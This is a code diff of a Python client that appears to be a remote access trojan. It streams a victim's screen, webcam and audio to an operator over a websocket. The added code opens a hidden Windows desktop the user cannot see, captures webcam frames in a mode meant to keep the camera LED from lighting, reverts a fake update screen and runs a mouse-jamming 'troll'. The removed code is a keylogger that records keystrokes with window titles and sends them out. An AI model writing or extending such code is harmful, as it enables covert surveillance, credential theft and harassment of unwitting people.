+        def _kill_black(hwnd, _):
+            cls = ctypes.create_unicode_buffer(256)
+            ctypes.windll.user32.GetClassNameW(hwnd, cls, 256)
+            if cls.value == "Tk":
+                buf = ctypes.create_unicode_buffer(256)
+                ctypes.windll.user32.GetWindowTextW(hwnd, buf, 256)
+                # Destroy black windows
+                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)  # WM_CLOSE
+            return True
+
+        EnumProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_void_p)
+        ctypes.windll.user32.EnumWindows(EnumProc(_kill_black), 0)
+    except: pass
+
+    # Clean up the temp HTML
+    try:
+        tmp_html = os.path.join(os.environ.get("TEMP", ""), "_omega_update.html")
+        os.remove(tmp_html)
+    except: pass
+
+    log("[FAKE_UPDATE] Reverted")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# HIDDEN OPERATOR DESKTOP  (Win32 CreateDesktopW — true separate desktop)
+# ─────────────────────────────────────────────────────────────────────────────
+_HIDDEN_DESK_NAME   = "OmegaHiddenDesk"
+_hidden_desk_handle  = None   # module-level HDESK
+_hidden_desk_proc    = None   # subprocess running on hidden desktop
+
+def _start_hidden_desktop(prog="explorer.exe"):
     """
-    Mirrors AnyDesk's adaptive codec: drops JPEG quality when latency is high,
-    restores it when the pipe is clear. Operates in 4 bands:
-      < 80ms  → 82 quality  (good)
-      < 150ms → 68 quality  (decent)
-      < 300ms → 52 quality  (congested)
-      ≥ 300ms → 35 quality  (very congested, save bandwidth)
+    Create a hidden Win32 desktop, launch a process on it, and return the desktop handle.
+    The user sees nothing — the hidden desktop is fully separate.
     """
+    global _hidden_desk_handle, _hidden_desk_proc
+    try:
+        import ctypes, ctypes.wintypes as wt
 
-    BANDS = [(80, 82), (150, 68), (300, 52), (float("inf"), 35)]
+        # DESKTOP_GENERIC_ALL = 0x01FF
+        DESKTOP_ALL = 0x01FF
+        hdesk = ctypes.windll.user32.CreateDesktopW(
+            _HIDDEN_DESK_NAME, None, None, 0, DESKTOP_ALL, None)
+        if not hdesk:
+            return False, "CreateDesktopW failed"
+        _hidden_desk_handle = hdesk
 
-    def __init__(self):
-        self._q = 80
-        self._last_ts = time.monotonic()
-        self._rtt_buf = []
+        # Build STARTUPINFOW with lpDesktop pointing to hidden desktop
+        class STARTUPINFOW(ctypes.Structure):
+            _fields_ = [
+                ("cb",              wt.DWORD),
+                ("lpReserved",      wt.LPWSTR),
+                ("lpDesktop",       wt.LPWSTR),
+                ("lpTitle",         wt.LPWSTR),
+                ("dwX",             wt.DWORD),
+                ("dwY",             wt.DWORD),
+                ("dwXSize",         wt.DWORD),
+                ("dwYSize",         wt.DWORD),
+                ("dwXCountChars",   wt.DWORD),
+                ("dwYCountChars",   wt.DWORD),
+                ("dwFillAttribute", wt.DWORD),
+                ("dwFlags",         wt.DWORD),
+                ("wShowWindow",     wt.WORD),
+                ("cbReserved2",     wt.WORD),
+                ("lpReserved2",     ctypes.c_char_p),
+                ("hStdInput",       wt.HANDLE),
+                ("hStdOutput",      wt.HANDLE),
+                ("hStdError",       wt.HANDLE),
+            ]
 
-    def record_send(self):
-        self._last_ts = time.monotonic()
+        class PROCESS_INFORMATION(ctypes.Structure):
+            _fields_ = [
+                ("hProcess",  wt.HANDLE),
+                ("hThread",   wt.HANDLE),
+                ("dwProcessId", wt.DWORD),
+                ("dwThreadId",  wt.DWORD),
+            ]
 
-    def record_ack(self, rtt_ms: float):
-        self._rtt_buf.append(rtt_ms)
-        if len(self._rtt_buf) > 10:
-            self._rtt_buf.pop(0)
-        avg = sum(self._rtt_buf) / len(self._rtt_buf)
-        for threshold, q in self.BANDS:
-            if avg < threshold:
-                self._q = q
-                break
+        si = STARTUPINFOW()
+        si.cb        = ctypes.sizeof(STARTUPINFOW)
+        si.lpDesktop = f"winsta0\\{_HIDDEN_DESK_NAME}"
+        pi = PROCESS_INFORMATION()
 
-    def quality(self) -> int:
-        return self._q
+        cmd = ctypes.create_unicode_buffer(prog)
+        ok  = ctypes.windll.kernel32.CreateProcessW(
+            None, cmd, None, None, False,
+            0x00000010,  # CREATE_NEW_CONSOLE
+            None, None,
+            ctypes.byref(si), ctypes.byref(pi))
+
+        if ok:
+            _hidden_desk_proc = pi.dwProcessId
+            log(f"[HIDDEN_DESK] Launched '{prog}' PID={pi.dwProcessId} on {_HIDDEN_DESK_NAME}")
+            return True, pi.dwProcessId
+        else:
+            err = ctypes.windll.kernel32.GetLastError()
+            return False, f"CreateProcess failed: {err}"
+
+    except Exception as e:
+        return False, str(e)
 
 
-_aq = AdaptiveQuality()
+def _capture_hidden_desktop(quality: int = 70) -> bytes:
+    """
+    Capture a screenshot from the hidden Win32 desktop using BitBlt.
+    Returns JPEG bytes, or empty if failed.
+    """
+    global _hidden_desk_handle
+    try:
+        import ctypes, ctypes.wintypes as wt
 
+        if not _hidden_desk_handle:
+            return b""
+
+        # Switch temporarily to hidden desktop for capture, then switch back
+        user_desk = ctypes.windll.user32.GetThreadDesktop(
+            ctypes.windll.kernel32.GetCurrentThreadId())
+
+        ctypes.windll.user32.SetThreadDesktop(_hidden_desk_handle)
+
+        # Now take screenshot using mss on the current desktop
+        try:
+            import mss, io
+            from PIL import Image
+            with mss.mss() as sct:
+                mon = sct.monitors[0]
+                shot = sct.grab(mon)
+            img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+            buf = io.BytesIO()
+            img.save(buf, format="JPEG", quality=quality)
+            frame = buf.getvalue()
+        except:
+            frame = b""
+
+        # Switch back to user's desktop
+        ctypes.windll.user32.SetThreadDesktop(user_desk)
+        return frame
+
+    except Exception as e:
+        log(f"[HIDDEN_CAP] {e}")
+        return b""
+
+
+def _stop_hidden_desktop():
+    """Kill the process on the hidden desktop and close the desktop handle."""
+    global _hidden_desk_handle, _hidden_desk_proc
+    try:
+        if _hidden_desk_proc:
+            subprocess.run(f"taskkill /f /pid {_hidden_desk_proc}",
+                           shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            _hidden_desk_proc = None
+    except: pass
+    try:
+        if _hidden_desk_handle:
+            ctypes.windll.user32.CloseDesktop(_hidden_desk_handle)
+            _hidden_desk_handle = None
+    except: pass
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SCREENSHOT  (PIL only — no cv2/mss/numpy)
+# ─────────────────────────────────────────────────────────────────────────────
+def _screenshot():
+    try:
+        from PIL import ImageGrab
+        import io
+        mons = _get_monitors()
+        bbox = mons[st.monitor_idx] if st.monitor_idx < len(mons) else mons[0]
+        img = ImageGrab.grab(bbox=bbox, all_screens=(bbox is None))
+        buf = io.BytesIO()
+        img.save(buf, format="JPEG", quality=st.quality)
+        return buf.getvalue()
+    except: return None
+
+def _screenshot_monitor(idx):
+    """Capture a specific monitor by index, returns JPEG bytes."""
+    try:
+        from PIL import ImageGrab
+        import io
+        mons = _get_monitors()
+        bbox = mons[idx] if idx < len(mons) else mons[0]
+        img = ImageGrab.grab(bbox=bbox, all_screens=(bbox is None))
+        buf = io.BytesIO()
+        img.save(buf, format="JPEG", quality=50)  # lower quality for grid
+        return buf.getvalue()
+    except: return None
+
+# ─────────────────────────────────────────────────────────────────────────────
+# HIGH PERFORMANCE SCREEN STREAMING
+# ─────────────────────────────────────────────────────────────────────────────
+_rtc = None
 
 async def stream_loop(ws):
     """High-speed Binary Multiplexer for Screen & Camera."""
     while True:
-        start_time = time.time()
         if st.streaming:
             try:
-                # Apex Ultra: Elevate process to High Priority during active streaming
+                # Elevate process priority during active streaming
                 if not hasattr(st, "_priority_set"):
                     try:
-                        import ctypes
-
                         ctypes.windll.kernel32.SetPriorityClass(
-                            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080
-                        )
+                            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080)
                         st._priority_set = True
-                        log("[STREAM] Apex Ultra Priority Active")
-                    except:
-                        pass
+                        log("[STREAM] High Priority Active")
+                    except: pass
 
-                # 1. Desktop Frame (Channel 0x03)
-                if capture_engine:
-                    frame = capture_engine.grab()
-                    if frame is not None:
-                        # Apex Ultra: Performance Downscaling for maximum snappiness
-                        try:
-                            h, w = frame.shape[:2]
-                            if w > 1280:
-                                # INTER_NEAREST is dramatically faster than INTER_LINEAR (zero blending)
-                                frame = cv2.resize(
-                                    frame,
-                                    (1280, int(h * (1280 / w))),
-                                    interpolation=cv2.INTER_NEAREST,
-                                )
-                        except:
-                            pass
+                if st.grid_mode:
+                    # ── Grid Mode: send each monitor on its own channel (0x10 + idx) ──
+                    mons = _get_monitors()
+                    for idx, mon in enumerate(mons[:4]):  # max 4 monitors
+                        frame_bytes = await asyncio.to_thread(_screenshot_monitor, idx)
+                        if frame_bytes:
+                            tag = 0x10 + idx
+                            await ws.send(struct.pack("B", tag) + frame_bytes)
+                    await asyncio.sleep(0.12)  # ~8fps for grid (less bandwidth)
+                    continue
 
-                        # Apex Ultra: Ultra-fast TurboJPEG Encoding (Zero-Copy)
-                        try:
-                            # Drop logic: If we are still sending, skip this frame
-                            # In asyncio, we can't easily check if a send is 'pending'
-                            # without custom protocol, but we can use a Lock.
-                            if not hasattr(st, "_stream_lock"):
-                                st._stream_lock = asyncio.Lock()
+                # ── Single Monitor Mode ──
+                # Try capture_engine first, fall back to PIL screenshot
+                frame = None
+                if capture_engine is not None:
+                    try:
+                        frame = capture_engine.grab()
+                    except Exception as e:
+                        log(f"[STREAM] capture_engine.grab() error: {e}")
 
-                            if st._stream_lock.locked():
-                                continue  # Skip frame to prevent backlog
-
-                            async with st._stream_lock:
-                                # Adaptive Quality: Sync with the engine's dynamic calculation
-                                q = capture_engine.quality()
-
-                                tj_obj = globals().get("tj")
-                                if tj_obj:
-                                    # TurboJPEG encodes directly from RGB
-                                    jpeg = tj_obj.encode(
-                                        frame,
-                                        quality=q,
-                                        pixel_format=globals().get("TJPF_RGB", 0),
-                                        jpeg_subsample=globals().get("TJSAMP_420", 2),
-                                    )
-                                else:
-                                    # Fallback to OpenCV
-                                    bgr_frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
-                                    _, jpeg = cv2.imencode(
-                                        ".jpg", bgr_frame, [cv2.IMWRITE_JPEG_QUALITY, q]
-                                    )
-
-                                # Send with a sanity check on payload size
-                                await ws.send(
-                                    struct.pack("B", 0x03)
-                                    + (
-                                        jpeg
-                                        if isinstance(jpeg, bytes)
-                                        else jpeg.tobytes()
-                                    )
-                                )
-                        except Exception as e:
-                            log(f"[STREAM] Encode Error: {e}")
-                            await asyncio.sleep(0.01)
+                if frame is not None and cv2 is not None:
+                    # Downscale to 1280p max for snappiness
+                    try:
+                        h, w = frame.shape[:2]
+                        if w > 1280:
+                            frame = cv2.resize(frame, (1280, int(h * (1280 / w))),
+                                               interpolation=cv2.INTER_AREA)
+                    except: pass
+                    try:
+                        bgr_frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+                        _, jpeg = cv2.imencode('.jpg', bgr_frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
+                        await ws.send(struct.pack("B", 0x03) + jpeg.tobytes())
+                    except Exception as e:
+                        log(f"[STREAM] encode error: {e}")
+                        await asyncio.sleep(0.1)
+                        continue
+                else:
+                    # PIL fallback
+                    frame_bytes = await asyncio.to_thread(_screenshot)
+                    if frame_bytes:
+                        await ws.send(struct.pack("B", 0x03) + frame_bytes)
                     else:
-                        await asyncio.sleep(0.05)  # Power save
+                        await asyncio.sleep(0.1)
                         continue
 
-                # 2. Camera Frame (Channel 0x04)
-                if st.camera_active and camera_engine:
-                    cam_frame = camera_engine.get_frame()
-                    if cam_frame:
-                        await ws.send(struct.pack("B", 0x04) + cam_frame)
+                # ── Camera (multi-camera, no-LED burst mode) ────────────────────
+                if st.camera_active and cv2 is not None:
+                    frame_bytes = await asyncio.to_thread(_grab_camera_frame, st.camera_idx)
+                    if frame_bytes:
+                        await ws.send(struct.pack("B", 0x04) + frame_bytes)
+                        st.last_cam_frame = frame_bytes  # cache for cam_freeze_frame troll
 
-                # 3. Dynamic FPS Control: honor st.stream_fps to prevent network congestion
-                fps_target = getattr(st, "stream_fps", 30)
-                # Precision sleep: calculate actual wait time based on loop duration
-                elapsed = time.time() - start_time
-                wait_time = max(0.001, (1.0 / fps_target) - elapsed)
-                await asyncio.sleep(wait_time)
+                # ── Hidden Operator Desktop stream (tag 0x0A) ────────────────────
+                if st.hidden_stream_active:
+                    if not hasattr(st, "_hdesk_frame_ctr"):
+                        st._hdesk_frame_ctr = 0
+                    st._hdesk_frame_ctr += 1
+                    # ~10fps for hidden desktop (every 6 frames at 60fps)
+                    if st._hdesk_frame_ctr % 6 == 0:
+                        hf = await asyncio.to_thread(_capture_hidden_desktop, 65)
+                        if hf:
+                            await ws.send(struct.pack("B", 0x0A) + hf)
+
+                await asyncio.sleep(0.016)  # ~60fps
             except Exception as e:
                 log(f"[STREAM] Error: {e}")
                 await asyncio.sleep(0.1)
         else:
-            if hasattr(st, "_cam_cap") and st._cam_cap:
-                st._cam_cap.release()
-                st._cam_cap = None
             await asyncio.sleep(0.5)
 
+# ─────────────────────────────────────────────────────────────────────────────
+# CAMERA  (no-LED burst mode: open → grab → close immediately)
+# ─────────────────────────────────────────────────────────────────────────────
+_cam_caps = {}   # idx → persistent cap when no-LED is OFF
 
-def _sc_find_device(device_index, want_loopback):
-    import sounddevice as sd
-    
+def _grab_camera_frame(idx: int = 0) -> bytes:
+    """Grab one JPEG frame. Uses DirectShow to minimise LED indicator."""
+    global cv2
+    if cv2 is None:
+        return b''
     try:
-        if device_index is not None:
-            # Validate the requested index exists and matches loopback requirement
-            try:
-                info = sd.query_devices(device_index)
-                if info['max_input_channels'] > 0:
-                    return device_index
-            except: pass
-            
-        devices = sd.query_devices()
-        
-        # Try to find a default if index not provided or invalid
-        if want_loopback:
-            # Apex Ultra: Prioritize WASAPI Loopback (Modern Windows way)
-            # We look for a device that is part of the 'Windows WASAPI' host API and is an input device
-            # Note: sounddevice often lists loopback devices as inputs when using WASAPI.
-            
-            wasapi_idx = -1
-            for i, api in enumerate(sd.query_hostapis()):
-                if 'WASAPI' in api['name']:
-                    wasapi_idx = i
-                    break
-            
-            # 1. Search for explicit "loopback" in name within WASAPI
-            for i, dev in enumerate(devices):
-                if dev['max_input_channels'] > 0 and dev['hostapi'] == wasapi_idx:
-                    if 'loopback' in dev['name'].lower():
-                        log(f"[AUDIO] Found WASAPI Loopback: {dev['name']} (Index {i})")
-                        return i
-            
-            # 2. Fallback to "Stereo Mix" or similar
-            for i, dev in enumerate(devices):
-                if dev['max_input_channels'] > 0:
-                    if 'stereo mix' in dev['name'].lower() or 'wave out' in dev['name'].lower():
-                        log(f"[AUDIO] Found Stereo Mix fallback: {dev['name']} (Index {i})")
-                        return i
-            
-            # 3. Last ditch: any WASAPI input might be it? 
-            # (Unlikely, but better than nothing)
-            # Actually, return None if we can't find a clear loopback.
+        if st.camera_no_led:
+            # Burst mode: open, grab, close. LED only flickers briefly.
+            cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH,  640)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+            cap.set(cv2.CAP_PROP_FPS, 15)
+            # Read a few frames to let auto-exposure settle
+            for _ in range(3): cap.grab()
+            ret, frame = cap.read()
+            cap.release()
         else:
-            # Standard microphone default
-            default_in = sd.default.device[0]
-            if default_in >= 0:
-                return default_in
-            
-            for i, dev in enumerate(devices):
-                if dev['max_input_channels'] > 0 and 'loopback' not in dev['name'].lower():
-                    return i
-                    
-        return None
+            # Persistent cap
+            if idx not in _cam_caps or not _cam_caps[idx].isOpened():
+                cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
+                cap.set(cv2.CAP_PROP_FRAME_WIDTH,  1280)
+                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+                cap.set(cv2.CAP_PROP_FPS, 30)
+                _cam_caps[idx] = cap
+            cap = _cam_caps[idx]
+            ret, frame = cap.read()
+
+        if ret and frame is not None:
+            _, jpeg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 65])
+            return jpeg.tobytes()
     except Exception as e:
-        log(f"[AUDIO] Device discovery error: {e}")
-        return None
+        log(f"[CAMERA] Error idx={idx}: {e}")
+    return b''
 
-
-async def mic_loop(ws):
-    """Independent mic capture using sounddevice — 0x05 tag."""
-    import sounddevice as sd
-
-    CHUNK = 2048
-    RATE = 44100
-    fail_count = 0
-    while True:
-        if not getattr(st, "mic_active", False):
-            fail_count = 0
-            await asyncio.sleep(0.25)
-            continue
-        
-        dev_idx = getattr(st, "mic_device_id", None)
-        dev_idx = _sc_find_device(dev_idx, want_loopback=False)
-        
-        if dev_idx is None:
-            log("[AUDIO-MIC] No mic found via sounddevice")
-            await asyncio.sleep(2)
-            continue
-            
+def enumerate_cameras() -> list:
+    """Detect all available cameras (physical + virtual)."""
+    global cv2
+    if cv2 is None:
+        return []
+    cameras = []
+    for i in range(10):
         try:
-            dev_info = sd.query_devices(dev_idx)
-            log(f"[AUDIO-MIC] Started: {dev_info['name']} (Index {dev_idx})")
-            
-            ch_attempts = [1, 2]
-            if dev_info['max_input_channels'] >= 2:
-                ch_attempts = [2, 1]
-
-            success = False
-            for ch in ch_attempts:
-                if ch > dev_info['max_input_channels']:
-                    continue
+            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
+            if cap.isOpened():
+                # Try to get the device name via DirectShow
+                name = f"Camera {i}"
                 try:
-                    def _audio_callback(indata, frames, time, status):
-                        if getattr(st, "mic_active", False):
-                            import numpy as np
-                            # MRL fix: proper float32 -> int16 conversion
-                            mono = indata.mean(axis=1) if indata.ndim > 1 else indata.flatten()
-                            pcm = (mono * 32767).clip(-32768, 32767).astype(np.int16).tobytes()
-                            
-                            # Feed WebSocket
-                            asyncio.run_coroutine_threadsafe(
-                                ws.send(struct.pack("B", 0x05) + pcm),
-                                global_loop
-                            )
+                    w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+                    h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+                    name = f"Camera {i} ({w}x{h})"
+                except: pass
+                cameras.append({"idx": i, "name": name})
+                cap.release()
+        except: pass
+    st.camera_list = cameras
+    return cameras
 
-                    stream = sd.InputStream(
-                        device=dev_idx, channels=ch, samplerate=RATE, 
-                        blocksize=CHUNK, dtype='int16', callback=_audio_callback
-                    )
-                    with stream:
-                        fail_count = 0
-                        while getattr(st, "mic_active", False):
-                            await asyncio.sleep(0.1)
-                    
-                    success = True
-                    break
-                except Exception as ch_e:
-                    log(f"[AUDIO-MIC] {ch}ch failed ({ch_e!r})")
-                    
-            if not success:
-                raise RuntimeError("All channel attempts failed")
-                
-            log("[AUDIO-MIC] Stopped")
-        except Exception as e:
-            fail_count += 1
-            backoff = min(2 * fail_count, 30)
-            log(f"[AUDIO-MIC] Error ({e!r}), retry in {backoff}s")
-            await asyncio.sleep(backoff)
-
-
-async def desktop_loop(ws):
-    """Independent desktop loopback using sounddevice WASAPI — 0x06 tag."""
-    # MRL fix: try soundcard first - far more reliable for WASAPI loopback on Windows
-    try:
-        import soundcard as sc
-        import numpy as np
-        loopbacks = [m for m in sc.all_microphones(include_loopback=True) if m.isloopback]
-        if loopbacks:
-            RATE_SC = 44100
-            CHUNK_SC = 1024
-            print(f"[AUDIO-DESK] soundcard loopback found: {loopbacks[0].name}")
-            while True:
-                if not getattr(st, "desktop_active", False):
-                    await asyncio.sleep(0.25)
-                    continue
-                try:
-                    with loopbacks[0].recorder(samplerate=RATE_SC, channels=1, blocksize=CHUNK_SC) as mic:
-                        while getattr(st, "desktop_active", False):
-                            data = mic.record(numframes=CHUNK_SC)
-                            mono = data.flatten()
-                            pcm = (mono * 32767).clip(-32768, 32767).astype(np.int16).tobytes()
-                            asyncio.run_coroutine_threadsafe(
-                                ws.send(struct.pack("B", 0x06) + pcm), global_loop)
-                            await asyncio.sleep(0)
-                except Exception as e:
-                    log(f"[AUDIO-DESK] soundcard error: {e}")
-                    await asyncio.sleep(2)
-            return
-    except Exception as e:
-        log(f"[AUDIO-DESK] soundcard unavailable ({e}), falling back to sounddevice")
-
-    import sounddevice as sd
-
-    CHUNK = 2048
-    RATE = 44100
-    fail_count = 0
-    while True:
-        if not getattr(st, "desktop_active", False):
-            fail_count = 0
-            await asyncio.sleep(0.25)
-            continue
-            
-        dev_idx = getattr(st, "desktop_device_id", None)
-        dev_idx = _sc_find_device(dev_idx, want_loopback=True)
-        
-        if dev_idx is None:
-            log("[AUDIO-DESK] No loopback device found via sounddevice")
-            await asyncio.sleep(2)
-            continue
-            
-        try:
-            dev_info = sd.query_devices(dev_idx)
-            log(f"[AUDIO-DESK] Started loopback: {dev_info['name']} (Index {dev_idx})")
-            
-            # Loopback is almost always stereo
-            ch_attempts = [2, 1]
-            success = False
-            for ch in ch_attempts:
-                if ch > dev_info['max_input_channels']:
-                    continue
-                try:
-                    def _desk_callback(indata, frames, time, status):
-                        if getattr(st, "desktop_active", False):
-                            import numpy as np
-                            # MRL fix: proper float32 -> int16 conversion
-                            mono = indata.mean(axis=1) if indata.ndim > 1 else indata.flatten()
-                            pcm = (mono * 32767).clip(-32768, 32767).astype(np.int16).tobytes()
-
-                            asyncio.run_coroutine_threadsafe(
-                                ws.send(struct.pack("B", 0x06) + pcm),
-                                global_loop
-                            )
-
-                    # MRL fix: use 44100Hz to match browser AudioContext
-                    actual_rate = 44100
-                    log(f"[AUDIO-DESK] Using rate {actual_rate}Hz for {ch}ch stream")
-                    stream = sd.InputStream(
-                        device=dev_idx, channels=ch, samplerate=actual_rate, 
-                        blocksize=CHUNK, dtype='int16', callback=_desk_callback
-                    )
-                    with stream:
-                        fail_count = 0
-                        while getattr(st, "desktop_active", False):
-                            await asyncio.sleep(0.1)
-                    
-                    success = True
-                    break
-                except Exception as ch_e:
-                    log(f"[AUDIO-DESK] {ch}ch failed ({ch_e!r})")
-                    
-            if not success:
-                raise RuntimeError("All channel attempts failed")
-                
-            log("[AUDIO-DESK] Stopped")
-        except Exception as e:
-            fail_count += 1
-            backoff = min(2 * fail_count, 30)
-            log(f"[AUDIO-DESK] Error ({e!r}), retry in {backoff}s")
-            await asyncio.sleep(backoff)
-
-
-# Keep audio_loop as a shim so existing call sites don't break
+# ─────────────────────────────────────────────────────────────────────────────
+# AUDIO LOOP  (Desktop loopback / Mic / Camera mic)
+# ─────────────────────────────────────────────────────────────────────────────
 async def audio_loop(ws):
-    """Shim — runs both mic and desktop simultaneously as independent tasks."""
-    await asyncio.gather(mic_loop(ws), desktop_loop(ws))
-
-
-# ── KEYLOGGER ──
-_keylog_buf = []
-_keylog_active = False
-_last_window = ""
-
-def _start_keylogger(ws_ref):
-    global _keylog_active, _last_window
-    if _keylog_active:
-        return
-    _keylog_active = True
-
-    def get_active_window():
-        try:
-            hwnd = ctypes.windll.user32.GetForegroundWindow()
-            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
-            buff = ctypes.create_unicode_buffer(length + 1)
-            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
-            return buff.value
-        except:
-            return "Unknown"
-
-    def _flush_buf():
-        if _keylog_buf:
-            flush = "".join(_keylog_buf)
-            _keylog_buf.clear()
-            asyncio.run_coroutine_threadsafe(
-                send(ws_ref, {"t": "keylog", "data": flush}), global_loop
-            )
-
-    def _periodic_flush():
-        """Send buffered keys every 3s even if < 5 chars."""
-        while _keylog_active:
-            time.sleep(3)
-            if _keylog_buf:
-                _flush_buf()
-
-    def _kl():
-        global _last_window
-        try:
-            import pynput.keyboard as kb
-
-            def on_press(key):
-                global _last_window
-                if not _keylog_active:
-                    return False
-                
-                # High Intelligence Window Tracking
-                curr_win = get_active_window()
-                if curr_win != _last_window:
-                    _last_window = curr_win
-                    ts = time.strftime("%H:%M:%S")
-                    _keylog_buf.append(f"\n\n[ {ts} | WINDOW: {curr_win} ]\n")
-
-                try:
-                    char = key.char or ""
-                except:
-                    # Map special keys
-                    k_name = str(key).replace("Key.", "")
-                    if k_name == "space": char = " "
-                    elif k_name == "enter": char = "\n"
-                    elif k_name == "backspace": char = "[BACK]"
-                    elif k_name == "tab": char = "\t"
-                    else: char = f"[{k_name}]"
-                
-                _keylog_buf.append(char)
-                # For high responsiveness, we can flush on every key or keep it buffered
-                if len(_keylog_buf) > 10:
-                    _flush_buf()
-
-            with kb.Listener(on_press=on_press) as l:
-                l.join()
-        except Exception as e:
-            log(f"[KEYLOG] Error: {e}")
-
-    threading.Thread(target=_kl, daemon=True).start()
-    threading.Thread(target=_periodic_flush, daemon=True).start()
-
-
-# ── COMMAND HANDLER ──
-# ── COMMAND REGISTRY ──
-COMMANDS = {}
-
-
-def register_command(name):
-    def decorator(func):
-        COMMANDS[name] = func
-        return func
-
-    return decorator
-
-
-@register_command("rtc_offer")
-async def cmd_rtc_offer(msg, ws):
-    if _rtc:
-        st.streaming = True  # Ensure capture is ready
-        await _rtc.handle_offer(msg["sdp"], msg["sdpType"])
-
-
-@register_command("rtc_ice")
-async def cmd_rtc_ice(msg, ws):
-    if _rtc:
-        _rtc.add_ice_candidate(msg)
-
-
-@register_command("rtc_toggle")
-async def cmd_rtc_toggle(msg, ws):
-    act = msg.get("action")
-    val = msg.get("value")
-    if act == "monitor":
-        st.monitor_idx = int(val)
-        if capture_engine:
-            capture_engine.set_monitor(st.monitor_idx)
-            asyncio.create_task(
-                send(ws, {"t": "monitors", "data": capture_engine.get_monitors()})
-            )
-    elif act == "style":
-        capture_engine.set_style(str(val))
-        log(f"[STREAM] Visual Style: {val}")
-    elif act == "camera":
-        new_active = bool(val)
-        new_idx = int(msg.get("idx", msg.get("camera_idx", 0)))
-        if camera_engine:
-            if new_active:
-                camera_engine.start(new_idx)
-                log(f"[CAMERA] Started index {new_idx}")
-            else:
-                camera_engine.stop()
-                log("[CAMERA] Stopped")
-        st.camera_active = new_active
-        st.camera_idx = new_idx
-    elif act == "mic":
-        st.mic_active = bool(val)
-        st.mic_device_id = msg.get("device_id", None)
-    elif act == "audio":
-        # 'audio' with source='desktop' controls desktop loopback
-        src = msg.get("source", "desktop")
-        if src == "mic":
-            st.mic_active = bool(val)
-            st.mic_device_id = msg.get("device_id", None)
+    while True:
+        if getattr(st, "audio_active", False):
+            try:
+                import soundcard as sc
+                mics = sc.all_microphones(include_loopback=True)
+                loopback = next((m for m in mics if m.isloopback), None)
+                if not loopback: loopback = sc.default_microphone()
+                with loopback.recorder(samplerate=44100) as mic:
+                    while getattr(st, "audio_active", False):
+                        data = mic.record(numframes=1024)
+                        pcm = (data * 32767).astype('int16').tobytes()
+                        await ws.send(struct.pack("B", 0x05) + pcm)
+            except Exception as e:
+                log(f"Audio error: {e}")
+                await asyncio.sleep(2)
+        elif getattr(st, "mic_active", False):
+            try:
+                import soundcard as sc
+                mic = sc.default_microphone()
+                with mic.recorder(samplerate=44100) as m:
+                    while getattr(st, "mic_active", False):
+                        data = m.record(numframes=1024)
+                        pcm = (data * 32767).astype('int16').tobytes()
+                        await ws.send(struct.pack("B", 0x07) + pcm)
+            except Exception as e:
+                log(f"Mic error: {e}")
+                await asyncio.sleep(2)
         else:
-            st.desktop_active = bool(val)
-            st.desktop_device_id = msg.get("device_id", None)
+            await asyncio.sleep(1)
 
-
-@register_command("set_quality")
-async def cmd_set_quality(msg, ws):
-    """Adjust JPEG capture quality (20–95). Affects bandwidth and latency."""
-    q = max(20, min(95, int(msg.get("quality", 75))))
-    if capture_engine:
-        capture_engine.set_quality(q)
-    log(f"[STREAM] Quality set to {q}")
-
-
-@register_command("ss_start")
-async def cmd_ss_start(msg, ws):
-    st.streaming = True
-    if capture_engine:
-        capture_engine.start()
-
-
-@register_command("audio_devices")
-async def cmd_audio_devices(msg, ws):
-    """Enumerate audio inputs (mics) and outputs (loopbacks). Marks default speaker's loopback as (Main)."""
-    try:
-        import soundcard as sc
-
-        all_mics = sc.all_microphones(include_loopback=True)
-        all_spks = sc.all_speakers()
-        # Find default speaker id for (Main) labelling
+# ─────────────────────────────────────────────────────────────────────────────
+# CHAOS MOUSE
+# ─────────────────────────────────────────────────────────────────────────────
+def _chaos_mouse_loop():
+    import random
+    sw = ctypes.windll.user32.GetSystemMetrics(0)
+    sh = ctypes.windll.user32.GetSystemMetrics(1)
+    while st.mouse_chaos:
         try:
-            default_spk_id = sc.default_speaker().id
-        except:
-            default_spk_id = None
-        try:
-            default_mic_id = sc.default_microphone().id
-        except:
-            default_mic_id = None
+            x = random.randint(0, sw)
+            y = random.randint(0, sh)
+            ctypes.windll.user32.SetCursorPos(x, y)
+            time.sleep(random.uniform(0.02, 0.08))
+        except: pass
 
-        inputs = []
-        for m in all_mics:
-            name = m.name
-            is_default = (m.id == default_mic_id and not m.isloopback) or (
-                m.isloopback and default_spk_id and default_spk_id in m.id
-            )
-            if is_default:
-                name = name + " (Main)"
-            inputs.append({"id": m.id, "name": name, "loopback": m.isloopback})
+# ─────────────────────────────────────────────────────────────────────────────
+# SCREENSHOT SCHEDULER
+# ─────────────────────────────────────────────────────────────────────────────
+async def screenshot_scheduler(ws):
+    while True:
+        if st.sched_ss and st.streaming is False:
+            data = await asyncio.to_thread(_screenshot)
+            if data:
+                await send_bin(ws, 0x03, data)
+            await asyncio.sleep(st.sched_interval)
+        else:
+            await asyncio.sleep(2)
 
-        outputs = [
-            {"id": s.id, "name": s.name + (" (Main)" if s.id == default_spk_id else "")}
-            for s in all_spks
-        ]
-        await send(ws, {"t": "audio_devices", "inputs": inputs, "outputs": outputs})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Audio enum failed: {e}"})
-
-
-@register_command("set_fps")
-async def cmd_set_fps(msg, ws):
